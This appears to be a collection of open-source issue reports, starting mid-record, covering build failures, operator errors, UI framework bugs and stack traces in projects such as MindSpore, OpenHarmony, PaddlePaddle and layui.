yes checking whether make supports the include directive... yes (GNU style) checking whether make supports nested variables... yes checking whether UID '1000' is supported by ustar format... yes checking whether GID '1000' is supported by ustar format... yes checking how to create a ustar tar archive... gnutar checking dependency style of gcc... gcc3 checking whether make supports nested variables... (cached) yes *** Checking versions checking for repo version... date2022-12-08 checking Open MPI version... 4.0.3rc4 checking Open MPI release date... Unreleased developer copy checking Open MPI repository version... date2022-12-08 checking for repo version... date2022-12-08 checking Open MPI Run-Time Environment version... 4.0.3rc4 checking Open MPI Run-Time Environment release date... Unreleased developer copy checking Open MPI Run-Time Environment repository version... date2022-12-08 checking for repo version... date2022-12-08 checking Open SHMEM version... 4.0.3rc4 checking Open SHMEM release date... Unreleased developer copy checking Open SHMEM repository version... date2022-12-08 checking for repo version... date2022-12-08 checking Open Portable Access Layer version... 4.0.3rc4 checking Open Portable Access Layer release date... Unreleased developer copy checking Open Portable Access Layer repository version... date2022-12-08 checking for bootstrap Autoconf version... 2.71 checking for bootstrap Automake version... 1.16 checking for boostrap Libtool version... ""2.4.6 Debian-2.4.6-15build2"" *** Initialization, setup configure: builddir: /home/zinc/workspace/mindspore/mindspore/build/mindspore/_deps/ompi-src configure: srcdir: /home/zinc/workspace/mindspore/mindspore/build/mindspore/_deps/ompi-src installing to directory ""/home/zinc/workspace/mindspore/mindspore/build/mindspore/.mslib/ompi_4.0.3_d840ab7329eb7d22d587e8df2a0a03d81fc79da45d8707afe8839aa91228ce92"" *** OPAL Configuration options checking if want to run code coverage... no checking if want to compile with branch probabilities... no checking if want to debug memory usage... no checking if want to profile memory usage... no checking if want developer-level compiler pickyness... no checking if want developer-level debugging code... no checking if want to developer-level timing framework... no checking if want to install project-internal header files... no checking if want pretty-print stacktrace... yes checking if want pty support... yes checking if want weak symbol support... yes checking if want dlopen support... yes checking for default value of mca_base_component_show_load_errors... enabled by default checking if want heterogeneous support... no checking if word-sized integers must be word-size aligned... no checking if want IPv6 support... no checking if want package/brand string... Open MPI zinc@TTTony Distribution checking if want ident string... 4.0.3rc4 checking if want to use an alternative checksum algo for messages... no checking maximum length of processor name... 256 checking maximum length of error string... 256 checking maximum length of object name... 64 checking maximum length of info key... 36 checking maximum length of info val... 256 checking maximum length of port name... 1024 checking maximum length of datarep string... 128 checking if want getpwuid support... yes checking for zlib in... (default search paths) checking for zlib.h... yes looking for library without search path checking for library containing deflate... -lz checking if libz requires libnl v1 or v3... checking will zlib support be built... yes checking __NetBSD__... no checking __FreeBSD__... no checking __OpenBSD__... no checking __DragonFly__... no checking __386BSD__... no checking __bsdi__... no checking __APPLE__... no checking __linux__... yes checking __sun__... no checking __sun... no checking for netdb.h... yes checking for netinet/in.h... yes checking for netinet/tcp.h... yes checking for struct sockaddr_in... yes checking if --with-cuda is set... not set (--with-cuda=) ./configure: line 13028: syntax error near unexpected token `)' ./configure: line 13028: ` )' CMake Error at cmake/utils.cmake:188 (message): error! when ./configure;--disable-mpi-fortran;CXXFLAGS=-D_FORTIFY_SOURCE=2 -O2;--prefix=/home/zinc/workspace/mindspore/mindspore/build/mindspore/.mslib/ompi_4.0.3_d840ab7329eb7d22d587e8df2a0a03d81fc79da45d8707afe8839aa91228ce92 in /home/zinc/workspace/mindspore/mindspore/build/mindspore/_deps/ompi-src Call Stack (most recent call first): cmake/utils.cmake:418 (__exec_cmd) cmake/external_libs/ompi.cmake:10 (mindspore_add_pkg) cmake/mind_expression.cmake:48 (include) CMakeLists.txt:73 (include)"
【OpenHarmony】【20210514】【轻内核子系统】集成测试：usleep精度测试中当usleep(100)，usleep(1000)测试概率性失败,"简要描述： usleep精度测试中当usleep(100)，usleep(1000)测试概率性失败； 删除usleep(100),测试用例执行1000次，发现usleep(1000)也会出现概率性失败 【环境信息】: 硬件开发板型号：Hi3516DV300 软件版本信息:https://hm-verify.obs.cn-north-4.myhuaweicloud.com/version/Daily_Version/2021-05-14_01-08-32/hispark_taurus.tar.gz 测试环境 其他 【预置条件】: 烧写上述软件版本成功，设备启动正常 【测试步骤】： ./ActsTimeApiTest.bin 【预期结果】： Run OK 【实际结果】： FAILED 【出现概率】：问题出现次数/实际测试次数 概率性失败 【定位信息】： Log、截图、多媒体文件等，所有和问题有关的信息： 源码： 日志截图：   <code>: HWTEST_P(UsleepParamTest, testUsleepAccuracy, Performance | SmallTest | Level1) { int interval = GetParam(); LOG(""\ntest interval:%d"", interval); struct timespec time1 = {0}, time2 = {0}; long duration; // unit: us double d = 0.0; printf("" size %d, %d\n"", sizeof(time2.tv_sec), sizeof(time2.tv_nsec)); for (int i = 1; i &lt;= ACCURACY_TEST_LOOPS; i++) { clock_gettime(CLOCK_MONOTONIC, &amp;time1); int rt = usleep(interval); clock_gettime(CLOCK_MONOTONIC, &amp;time2); EXPECT_EQ(rt, 0); //duration = (time2.tv_sec - time1.tv_sec)*1000000 + (time2.tv_nsec - time1.tv_nsec)/1000; duration = (time2.tv_sec*1000000 + time1.tv_nsec/1000) - (time2.tv_sec*1000000 + time1.tv_nsec/1000); printf(""testloop %d, actual usleep duration: %ld us, %d, %d\n"", i, duration, time2.tv_nsec, time1.tv_nsec); d += duration; } d = d / ACCURACY_TEST_LOOPS; // average LOG(""average duration: %.2f"", d); EXPECT_GE(d, interval) &lt;&lt; ""actual sleep time shoud greater or equal to the input-parameter\n""; ASSERT_NEAR(d, interval, SLEEP_ACCURACY) &lt;&lt; ""usleep accuracy check fail\n""; } INSTANTIATE_TEST_CASE_P(SleepTest, UsleepParamTest, testing::Values(100, 1000, 10*1000, 20*1000, 30*1000, 300*1000, 3000*1000))"
【多输入】多输入时性能很差，伴随内存泄露,"多输入写法: 现象，显存占用异常，没有help_tensor时大概8G，现在起步12-15G，同时推理和训练速度都非常慢，显卡利用率只是偶尔不为0，基本不怎么动。   <code>: context.set_context(mode=context.GRAPH_MODE, device_target='GPU') # GRAPH_MODE PYNATIVE_MODE init('nccl') # gpu context.set_auto_parallel_context(device_num=get_group_size(), parallel_mode=ParallelMode.DATA_PARALLEL, gradients_mean=True, parameter_broadcast=True) ... class Net(nn.Cell): ... def construct(self, x_tuple): x, help_tensor = x_tuple ... def train(...): ... # model is an instance of TrainOneStepCell for i, data in enumerate(data_iterator): x, y = data help_tensor = ms.Tensor([i], dtype=ms.float32) output = model((x, help_tensor), y) ..."
expand_op 报dtype推断错误。,"运行错误log: 这行是不是有问题？ https://github.com/PaddlePaddle/Paddle/blob/768059b3a024d8cd04067389b9cbb183ef80b343/python/paddle/fluid/layers/nn.py#L9693 建议修改为   <code>: C++ Callstacks: Tensor holds the wrong type, it holds float, but desires to be int at [/paddle/paddle/fluid/framework/tensor_impl.h:30] PaddlePaddle Call Stacks: 0 0x7fa93f31a9d0p void paddle::platform::EnforceNotMet::Init&lt;char const*&gt;(char const*, char const*, int) + 352 1 0x7fa93f31ad49p paddle::platform::EnforceNotMet::EnforceNotMet(std::__exception_ptr::exception_ptr, char const*, int) + 137 2 0x7fa93f325779p int const* paddle::framework::Tensor::data&lt;int&gt;() const + 233 3 0x7fa93fc846e6p paddle::operators::get_expand_times(paddle::framework::ExecutionContext const&amp;) + 470 4 0x7fa93fd2ddcep void paddle::operators::ExpandKernel&lt;paddle::platform::CUDADeviceContext, float&gt;::Expand&lt;4&gt;(paddle::framework::ExecutionContext const&amp;) const + 174 temp_out = helper.create_variable_for_type_inference('int32')"
关于startPage方法和RowBounds方式,##关于startPage方法和RowBounds方式 这个方法的参数为和，为第几页，为每页数量，在大多数前台框架中，使用这两个参数比较方便。 但是这种方式和不一致，如果不了解这种区别就会出错，中的参数是和，和一样，和<b>很不一样</b>，是起始的行号，是从几个开始，而是起始的页码。 由于这种不同的存在，可能会导致一些意外出现，<b>因而，这里希望各位使用分页插件或想使用分页插件说说自己的想法和建议，哪一种方式更好？是否有必要进行统一，以那个为准</b>？   <code>: pageNum pageSize pageNum pageSize RowBounds RowBounds offset limit limit pageSize offset pageNum offset pageNum offset = (pageNum-1)*pageSize
"service嵌套调用,ds失效","JDK版本: 1.8 SpringBoot版本: 1.5.9.RELEASE Starter版本: 2.3.4 #代码如下: 2个库: master和tea 期望通过SysService 查询出来的都是tea这个库的 sysService:方法和类上都加了ds(""tea"") TestService: 不加任何注解 controller: 期望: test1 和test2多次查询tea这个库 实际: test1正常查询,执行的是查询tea test2报错, 查询的是mater这个库   <code>: @Service @DS(""tea"") public class SysServiceImpl implements SysService { @Override @DS(""tea"") public User getUserByPhone(String phone) { String sql=""select * from user where phone=:phone""; return teaService.get(sql); } @Override public User getUserByPhone(String phone) { return sysService .getUserByPhone(phone); } @GetMapping(value = ""/test1"") public Object test1() { return sysService.getUserByPhone(""xxx""); } @GetMapping(value = ""/test2"") public Object test2() { return userService.getUserByPhone(""xxx""); }"
算子Infer接口分离InferShape和InferType,"RFC Use this template for requirement to be discussed Requirement Use this template for Confirmed requirements Backgroud（背景信息） 当前算子 Infer 时，会统一将 Shape 的 Type 一起推导出来。 算子 Infer 接口的调用时机: 前端转成图时统一全图推导 动态 shape 场景下，每次执行时，更新实际的 shape 其他。包括变换局部图场景下的小范围推导等。 Origin（信息来源） Shape 和 Type 绑定，一同推导。分开两者后，可以按需取用。 Benefit / Necessity （价值/作用） 只需要更新 Shape 信息时，不需要整体调用： 减少调用的实际耗时 减少额外的依赖（比如只需 Shape 推导，就不需要去执行 Type 的推导验证） Design（设计方案） 算子注册 原： 新： 类新增/修改 Infer 基类 注册辅助类 兼容类 库存算子的 Infer 函数，通过兼容类兼容新方式 流程适配 注册宏 库存算子注册类依旧用 ，注册时将其转为兼容类 前端适配 判断是否有实现的地方，通过 、、 适配 调用函数实现的地方通过 、 适配 后端适配 只需要更新 shape 的地方用 适配 同时需要更新 shape 和 type 的地方用 适配   <code>: AbstractBasePtr OpAInfer(const abstract::AnalysisEnginePtr &amp;, const PrimitivePtr &amp;primitive, const std::vector&lt;AbstractBasePtr&gt; &amp;input_args) { ... auto infer_type = OpAInferType(primitive, input_args); auto infer_shape = OpAInferShape(primitive, input_args); return abstract::MakeAbstract(infer_shape, infer_type); } REGISTER_PRIMITIVE_EVAL_IMPL(OpA, prim::kPrimOpA, OpAInfer, nullptr, true); class OpAInfer : public OpInferBase { public: ... BaseShapePtr InferShape(const PrimitivePtr &amp;primitive, const std::vector&lt;AbstractBasePtr&gt; &amp;input_args) const override; TypePtr InferType(const PrimitivePtr &amp;primitive, const std::vector&lt;AbstractBasePtr&gt; &amp;input_args) const override; } REGISTER_PRIMITIVE_OP_INFER_IMPL(OpA, prim::kPrimOpA, OpAInfer, false); OpInferBase class OpInferBase { public: OpInferBase() = default; virtual ~OpInferBase() = default; virtual BaseShapePtr InferShape(const PrimitivePtr &amp;primitive, const std::vector&lt;AbstractBasePtr&gt; &amp;input_args) const = 0; virtual TypePtr InferType(const PrimitivePtr &amp;primitive, const std::vector&lt;AbstractBasePtr&gt; &amp;input_args) const = 0; virtual ValuePtr InferValue(const PrimitivePtr &amp;primitive, const std::vector&lt;AbstractBasePtr&gt; &amp;input_args) const { return kAnyValue; } virtual std::set&lt;int64_t&gt; GetValueDependArgIndices() const { return {}; } virtual AbstractBasePtr InferShapeAndType(const abstract::AnalysisEnginePtr &amp;engine, const PrimitivePtr &amp;primitive, const std::vector&lt;AbstractBasePtr&gt; &amp;input_args) const { auto type = InferType(primitive, input_args); auto shape = InferShape(primitive, input_args); return MakeAbstract(shape, type); } }; StandardPrimitiveImplReg class MS_CORE_API StandardPrimitiveImplReg { public: StandardPrimitiveImplReg() = default; StandardPrimitiveImplReg(const InferAbstractImpl &amp;infer_abstract, const InferValueImpl &amp;infer_value, bool in_white_list); StandardPrimitiveImplReg(const OpInferBasePtr &amp;op_infer, bool is_impl_infer_value) : op_infer_(op_infer), is_impl_infer_value_(is_impl_infer_value) {} ~StandardPrimitiveImplReg() = default; const OpInferBasePtr Get() const { return op_infer_; } AbstractBasePtr InferShapeAndType(const abstract::AnalysisEnginePtr &amp;engine, const PrimitivePtr &amp;primitive, const std::vector&lt;AbstractBasePtr&gt; &amp;input_args) const; BaseShapePtr InferShape(const PrimitivePtr &amp;prim, const AbstractBasePtrList &amp;args) const; ValuePtr InferValue(const PrimitivePtr &amp;prim, const AbstractBasePtrList &amp;args) const; bool IsImplInferShapeAndType() const { return is_impl_infer_shape_and_type_ &amp;&amp; op_infer_ != nullptr; } bool IsImplInferValue() const { return is_impl_infer_value_ &amp;&amp; op_infer_ != nullptr; } bool IsInWhileList() const { return in_white_list_; } private: OpInferBasePtr op_infer_{nullptr}; // Infer shape, type and value. bool is_impl_infer_shape_and_type_{true}; bool is_impl_infer_value_{false}; // in_white_list_ is true means this primitive can be executed by vm backend // else will be optimized by frontend bool in_white_list_{true}; }; OpInferCommon class OpInferCommon : public OpInferBase { public: OpInferCommon() = delete; OpInferCommon(const InferAbstractImpl &amp;infer_impl, const InferValueImpl &amp;infer_value_impl) : infer_impl_(infer_impl), infer_value_impl_(infer_value_impl) {} ~OpInferCommon() = default; BaseShapePtr InferShape(const PrimitivePtr &amp;primitive, const std::vector&lt;AbstractBasePtr&gt; &amp;input_args) const override; TypePtr InferType(const PrimitivePtr &amp;primitive, const std::vector&lt;AbstractBasePtr&gt; &amp;input_args) const override; ValuePtr InferValue(const PrimitivePtr &amp;primitive, const std::vector&lt;AbstractBasePtr&gt; &amp;input_args) const override; AbstractBasePtr InferShapeAndType(const abstract::AnalysisEnginePtr &amp;engine, const PrimitivePtr &amp;primitive, const std::vector&lt;AbstractBasePtr&gt; &amp;input_args) const override; private: InferAbstractImpl infer_impl_{nullptr}; InferValueImpl infer_value_impl_{nullptr}; }; REGISTER_PRIMITIVE_EVAL_IMPL #define REGISTER_PRIMITIVE_OP_INFER_IMPL(name, primitive, OP_INFER_ClASS, is_impl_infer_value) \ ... IsImplInferShapeAndType IsImplInferValue IsInWhileList InferShapeAndType InferValue InferShape InferShapeAndType"
"通知组件->Console 控制台 清屏与自动滚屏功能同时开启,组件按钮显示重叠","当同时使用清屏与自动滚屏功能时, 组件排布过于紧凑,近乎于重叠显示 请提供截图 明确描述组件需求 清屏按钮与自动滚屏选择框显示有间隔 组件版本 7.0.0 浏览器 MAUI MAUI-Blazor   <code>: &lt;Console HeaderText=""检测信息"" Items=""@MessageList"" Height=""300"" ShowAutoScroll=""true""/&gt;"
在弹层表格里面进行添加修改表格的数据，表格不会自动刷新数据,"在弹层表格里面进行添加修改表格的数据，表格不会自动刷新数据，数据已经保存成功，需要手动刷新表格数据。我添加页面的保存方法是这样的 ，通过tab页签打开这个页面进行添加修改，表格的自动刷新是正常的，问题就是在弹层表格里面加载这个页面添加修改后表格不会自动刷新，是需要修改哪里吗？   <code>: function submitHandler() { if ($.validate.form()) { $.operate.save(prefix + ""/add"", $('#form-add').serialize()); } }"
tabs切换监听，只切换了一次却触发了多次,"<div> 查询统计 曲线分析 风向统计分析 风速统计分析 <div> <div> layui.use('element',function(){ var element = layui.element; element.on('tab(demo)', function(data){ console.log(this); //当前Tab标题所在的原始DOM元素 console.log(data.index); //得到当前Tab的所在下标 console.log(data.elem); //得到当前的Tab大容器 }); }) 以上为代码。 点击一个tab后，控制台打印了5次。也就是说点击一次触发5次。这是什么原因呢？有解决方法么？   <code>: &lt;%@ include file=""table.jsp"" %&gt; &lt;/div&gt; &lt;div class=""layui-tab-item""&gt; &lt;%@ include file=""chart.jsp"" %&gt; &lt;/div&gt; &lt;div class=""layui-tab-item""&gt; &lt;%@ include file=""winddirection.jsp"" %&gt; &lt;/div&gt; &lt;div class=""layui-tab-item""&gt; &lt;%@ include file=""windspeed.jsp"" %&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt;"
流程图导出的文件大小、质量优化,"用了下面的方法，PDF文件变小很多且清晰度提升很大 不专业，供参考 修改resources\assets\statics\public\js\grapheditor\index.html 引用了3个js库   <code>: &lt;script type=""text/javascript"" src=""js/html2canvas.min.js""&gt;&lt;/script&gt; &lt;script type=""text/javascript"" src=""js/canvas2image.js""&gt;&lt;/script&gt; &lt;script type=""text/javascript"" src=""js/jsPDF.js""&gt;&lt;/script&gt; var boxlist=[]; var tagname=['rect','ellipse','path']; //获取dom节点 function findChild(dom){ for(var i=0;i&lt;dom.children.length;i++){ if(dom.children[i].children.length&gt;0){ findChild(dom.children[i]); } if(tagname.indexOf(dom.children[i].tagName)!=-1){ if(dom.children[i].tagName==""path""&amp;&amp;dom.children[i].getBBox().height&lt;500&amp;&amp;dom.children[i].getBBox().width&lt;500){ boxlist.unshift(dom.children[i].getBBox()); } else if(dom.children[i].tagName!=""path""){ boxlist.unshift(dom.children[i].getBBox()); } } } } //处理svg区域 function downsvg(type) { var divdom = document.getElementsByClassName(""geDiagramContainer"")[0]; var svg = divdom.getElementsByTagName(""svg"")[0]; //var rectlist = svg.getElementsByTagName(""rect""); //var ellipseList = svg.getElementsByTagName(""ellipse""); //var pathList = svg.getElementsByTagName(""path""); var left = 0; var right = 0; var top = 0; var bottom = 0; findChild(svg); for (var i = 0; i &lt; boxlist.length; i++) { var path = boxlist[i]; //left var tx = path.x; //top var ty = path.y; //right var bx = path.x + path.width; //bottom var by = path.y + path.height; left = left == 0 ? tx : (left &gt; tx ? tx : left); right = right == 0 ? bx : (right &lt; bx ? bx : right); top = top == 0 ? ty : (top &gt; ty ? ty : top); bottom = bottom == 0 ? by : (bottom &lt; by ? by : bottom); } left -= 100; top -= 100; right +=100; bottom +=100; var svgheight = bottom - top; var svgwidth = right - left; var svglastwidth = svg.width.animVal.value; var svglastheight = svg.height.animVal.value; html2canvas(svg, { backgroundColor: '#ef5350', scale: 4, width: svgwidth, height: svgheight, x: left - divdom.scrollLeft + divdom.offsetLeft, y: top - divdom.scrollTop + divdom.offsetTop, allowTaint: true, taintTest: true, useCORS: true, backgroundColor: null }).then(function (canvas) { if (type == ""pdf"") { exportCanvasAsPDF(canvas, svgwidth, svgheight); } else { if (canvas.msToBlob) { // IE 9+浏览器 blob = canvas.msToBlob(); window.navigator.msSaveBlob(blob); } else { exportCanvasAsPNG(canvas, svgwidth, svgheight); } } }); } //导出PDF function exportCanvasAsPDF(canvas, svgwidth, svgheight) { canvas = canvasToImage(canvas, ""#ffffff""); //返回图片URL，参数：图片格式和清晰度(0-1) var pageData = Canvas2Image.getDataURL(canvas, 'image/jpeg', svgwidth * 2, svgheight * 2); //方向默认竖直，尺寸ponits，格式a4【595.28,841.89] var pdf = new jsPDF('p', 'pt', 'a4'); //需要dataUrl格式 if(svgwidth/svgheight&gt;595.28/841.89){ pdf.addImage(pageData, 'image/jpeg', 0, 0, 595.28, 595.28/svgwidth* svgheight); } else{ pdf.addImage(pageData, 'image/jpeg', 0, 0, 841.89/svgheight*svgwidth, 841.89); } pdf.save(decodeURI(getQueryVariable(""title""))); } //导出PNG function exportCanvasAsPNG(cvas, svgwidth, svgheight) { var url = Canvas2Image.getDataURL(cvas, 'image/png', svgwidth * 2, svgheight * 2); //var url=cvas.toDataURL('image/jpge'); var dlLink = document.createElement('a'); dlLink.download = decodeURI(getQueryVariable(""title"")); dlLink.href = url; dlLink.dataset.downloadurl = ['image/png', dlLink.download, dlLink.href].join(':'); document.body.appendChild(dlLink); dlLink.click(); document.body.removeChild(dlLink); } //更改canvas的北京颜色 function canvasToImage(canvas, backgroundColor) { //cache height and width var w = canvas.width; var h = canvas.height; var context = canvas.getContext(""2d""); var data; if (backgroundColor) { //get the current ImageData for the canvas. data = context.getImageData(0, 0, w, h); //store the current globalCompositeOperation var compositeOperation = context.globalCompositeOperation; //set to draw behind current content context.globalCompositeOperation = ""destination-over""; //set background color context.fillStyle = backgroundColor; //draw background / rect on entire canvas context.fillRect(0, 0, w, h); } //get the image data from the canvas //var imageData = canvas.toDataURL(""image/png""); if (backgroundColor) { //clear the canvas //context.clearRect (0,0,w,h); //restore it with original / cached ImageData //context.putImageData(data, 0,0); //reset the globalCompositeOperation to what it was context.globalCompositeOperation = compositeOperation; } //return the Base64 encoded data url string return canvas; }"
EffcientnetV2存在算子溢出,"算子溢出 /device ascend : -- MindSpore version 1.2.0: -- Python version : -- OS platform and distribution (e.g., Linux Ubuntu 18.04):   <code>: efficientnetv2在GPU平台上不存在算子溢出，但是在Ascend上loss始终显示为nan"
"[CT][MS][ascend]Single op compile failed, op: strided_slice_d","Single op compile failed, op: strided_slice_d / 硬件环境: /device ascend : -- MindSpore version :master-45714 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode graph pytest -s numpy_native/test_numpy_native_math6.py::test_numpy_native_digitize_right_not_bool case pass   <code>: def test_numpy_native_digitize_right_not_bool(): x = numpy.random.rand(2, 3).astype(numpy.float32) bins = [0, 1, 2, 3] &gt; res = npdigitize(Tensor(x), Tensor(bins), right='1') &gt; output = self._graph_executor(tuple(new_inputs), phase) E RuntimeError: Single op compile failed, op: strided_slice_d_12170813192694698011_3. E E ---------------------------------------------------- E - Operator Compilation Exception Message: (For framework developers) E ---------------------------------------------------- E 2022-11-20 17:55:32.842431+00:00: Query except_msg:Traceback (most recent call last): E File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/te_fusion/parallel_compilation.py"", line 1623, in run E op_impl_switch=self._op_impl_switch) E File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/te_fusion/fusion_manager.py"", line 1292, in build_single_op E compile_info = call_op() E File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/te_fusion/fusion_manager.py"", line 1279, in call_op E opfunc(*inputs, *outputs, *new_attrs, **kwargs) E File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/tbe/common/utils/para_check.py"", line 547, in _in_wrapper E return func(*args, **kwargs) E File ""/usr/local/Ascend/latest/opp/op_impl/built-in/ai_core/tbe/impl/strided_slice_d.py"", line 1128, in strided_slice_d E error_manager_vector.raise_err_specific_reson(""strided_slice_d"", ""Parameter Invalid!"") E File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/tbe/common/utils/errormgr/error_manager_vector.py"", line 284, in raise_err_specific_reson E raise RuntimeError(args_dict, msg) E RuntimeError: ({'errCode': 'E61001', 'op_name': 'strided_slice_d', 'reason': 'Parameter Invalid!'}, 'In op [strided_slice_d], [Parameter Invalid!]')"
How to merge non-sequential output with sequential output?,"Suppose I have two data types generated by data provider, one is sequential type and the other non-sequential. In the begining these two data will follow seperate network flows(for example sequence will go to lstm and non-sequence will go to FC), marked as flow_seq and flow_nonseq. Then I want to join these two flow together as sequential data and proceed to next level. How to perform such merge? Belowing is simple descriptive code: sequential flow: non-sequential flow: then merge as new sequential data where merged[i-th step] = seq_lstm[i-th step] + non_seq_fc: How can i merge these two data? BTW, seq_data and non_seq_data are provided by one data provider.   <code>: seq_data = layer.data(name=""sequential_feature"", type=dense_vector_sequence(M)) seq_fc=layer.fc(input=seq_data ,act=linear,size=hid_dim) seq_lstm=layer.lstmemory(input=seq_fc,act=relu) non_seq_data = layer.data(name=""non_sequential_feature"",type=dense_vector(K)) non_seq_fc=layer.fc(input=seq_data ,act=tah,size=hid_dim) merged=somewhat_concat(seq_lstm, non_seq_fc) merged_lstm = layer.lstmemory(input=merged,act=relu)"
文档-页面元素-布局-五、列间距 demo有误,"示例代码为： 按照上述代码进行设置无效 应该为：   <code>: &lt;div class=""layui-row layui-col-space10""&gt; &lt;div class=""layui-col-md4""&gt; 1/3 &lt;/div&gt; &lt;div class=""layui-col-md4""&gt; 1/3 &lt;/div&gt; &lt;div class=""layui-col-md4""&gt; 1/3 &lt;/div&gt; &lt;/div&gt; &lt;div class=""layui-container ""&gt; &lt;div class=""layui-row layui-col-space10""&gt; &lt;div class=""layui-col-xs4""&gt; &lt;div style=""background-color: blanchedalmond;""&gt;1/3&lt;/div&gt; &lt;/div&gt; &lt;div class=""layui-col-xs4""&gt; &lt;div style=""background-color: blanchedalmond;""&gt;1/3&lt;/div&gt; &lt;/div&gt; &lt;div class=""layui-col-xs4""&gt; &lt;div style=""background-color: blanchedalmond;""&gt;1/3&lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt;"
[请教] entity content is too long【分页】,"版本: V1.0.0 问题: es 索引内数据量较多，查询全部数据 已通过 下面接口设置了一个较大的数据，来解决es只能查询1W条数据的限制 <ol start=""3""> 现在通过selectList查询时，还是只能查询出1W条数据，通过.size(70000000)设置了一个较大的数据量报错 entity content is too long [171098416] for the configured buffer limit [104857600] 求教 网上搜索解决方案可以通过设置HeapBufferedResponseConsumerFactory 修改 DEFAULT_BUFFER_LIMIT = 100 * 1024 * 1024。 想问既然用了我们的框架，框架层面有没有解决方案？ 感谢   <code>: put _all/_settings { ""index.max_result_window"":20000000 }"
Activiti中流程实例无法删除,环境信息 pigx版本: 4.4.0 是否修改包名: 否 提供详细 在流程管理界面，我想删除原数据库自带的实例，删除报错：   <code>: java.lang.NullPointerException: null at org.activiti.engine.impl.db.DbSqlSession$CheckedDeleteOperation.sameIdentity(DbSqlSession.java:274) ~[activiti-engine-5.22.0.jar:5.22.0] at org.activiti.engine.impl.db.DbSqlSession.delete(DbSqlSession.java:183) ~[activiti-engine-5.22.0.jar:5.22.0] at org.activiti.engine.impl.persistence.entity.HistoricProcessInstanceEntityManager.deleteHistoricProcessInstanceById(HistoricProcessInstanceEntityManager.java:82) ~[activiti-engine-5.22.0.jar:5.22.0] at org.activiti.engine.impl.persistence.entity.ExecutionEntityManager.deleteProcessInstanceCascade(ExecutionEntityManager.java:103) ~[activiti-engine-5.22.0.jar:5.22.0] at org.activiti.engine.impl.persistence.entity.ExecutionEntityManager.deleteProcessInstance(ExecutionEntityManager.java:70) ~[activiti-engine-5.22.0.jar:5.22.0] at org.activiti.engine.impl.persistence.entity.ExecutionEntityManager.deleteProcessInstancesByProcessDefinition(ExecutionEntityManager.java:48) ~[activiti-engine-5.22.0.jar:5.22.0] at org.activiti.engine.impl.persistence.entity.DeploymentEntityManager.deleteDeployment(DeploymentEntityManager.java:77) ~[activiti-engine-5.22.0.jar:5.22.0] at org.activiti.engine.impl.persistence.deploy.DeploymentManager.removeDeployment(DeploymentManager.java:220) ~[activiti-engine-5.22.0.jar:5.22.0] at org.activiti.engine.impl.cmd.DeleteDeploymentCmd.execute(DeleteDeploymentCmd.java:44) ~[activiti-engine-5.22.0.jar:5.22.0] at org.activiti.engine.impl.cmd.DeleteDeploymentCmd.execute(DeleteDeploymentCmd.java:24) ~[activiti-engine-5.22.0.jar:5.22.0] at org.activiti.engine.impl.interceptor.CommandInvoker.execute(CommandInvoker.java:24) ~[activiti-engine-5.22.0.jar:5.22.0] at org.activiti.engine.impl.interceptor.CommandContextInterceptor.execute(CommandContextInterceptor.java:57) ~[activiti-engine-5.22.0.jar:5.22.0] at org.activiti.spring.SpringTransactionInterceptor$1.doInTransaction(SpringTransactionInterceptor.java:47) [activiti-spring-5.22.0.jar:5.22.0] at org.springframework.transaction.support.TransactionTemplate.execute(TransactionTemplate.java:140) [spring-tx-5.3.19.jar:5.3.19] at org.activiti.spring.SpringTransactionInterceptor.execute(SpringTransactionInterceptor.java:45) [activiti-spring-5.22.0.jar:5.22.0] at org.activiti.engine.impl.interceptor.LogInterceptor.execute(LogInterceptor.java:31) [activiti-engine-5.22.0.jar:5.22.0] at org.activiti.engine.impl.cfg.CommandExecutorImpl.execute(CommandExecutorImpl.java:40) [activiti-engine-5.22.0.jar:5.22.0] at org.activiti.engine.impl.cfg.CommandExecutorImpl.execute(CommandExecutorImpl.java:35) [activiti-engine-5.22.0.jar:5.22.0] at org.activiti.engine.impl.RepositoryServiceImpl.deleteDeployment(RepositoryServiceImpl.java:91) [activiti-engine-5.22.0.jar:5.22.0] at com.pig4cloud.pigx.act.service.impl.ProcessServiceImpl.removeProcIns(ProcessServiceImpl.java:148) [classes/:na] at com.pig4cloud.pigx.act.service.impl.ProcessServiceImpl$$FastClassBySpringCGLIB$$21f8ad67.invoke(&lt;generated&gt;) [classes/:na] at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:218) [spring-core-5.3.19.jar:5.3.19] at org.springframework.aop.framework.CglibAopProxy.invokeMethod(CglibAopProxy.java:386) [spring-aop-5.3.19.jar:5.3.19] at org.springframework.aop.framework.CglibAopProxy.access$000(CglibAopProxy.java:85) [spring-aop-5.3.19.jar:5.3.19] at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:704) [spring-aop-5.3.19.jar:5.3.19] at com.pig4cloud.pigx.act.service.impl.ProcessServiceImpl$$EnhancerBySpringCGLIB$$b7233358.removeProcIns(&lt;generated&gt;) [classes/:na] at com.pig4cloud.pigx.act.controller.ProcessController.deleteProcIns(ProcessController.java:76) [classes/:na] at com.pig4cloud.pigx.act.controller.ProcessController$$FastClassBySpringCGLIB$$b854d28d.invoke(&lt;generated&gt;) [classes/:na] at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:218) [spring-core-5.3.19.jar:5.3.19] at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.invokeJoinpoint(CglibAopProxy.java:793) [spring-aop-5.3.19.jar:5.3.19] at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:163) [spring-aop-5.3.19.jar:5.3.19] at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:763) [spring-aop-5.3.19.jar:5.3.19] at org.springframework.aop.interceptor.ExposeInvocationInterceptor.invoke(ExposeInvocationInterceptor.java:97) [spring-aop-5.3.19.jar:5.3.19] at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) [spring-aop-5.3.19.jar:5.3.19] at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:763) 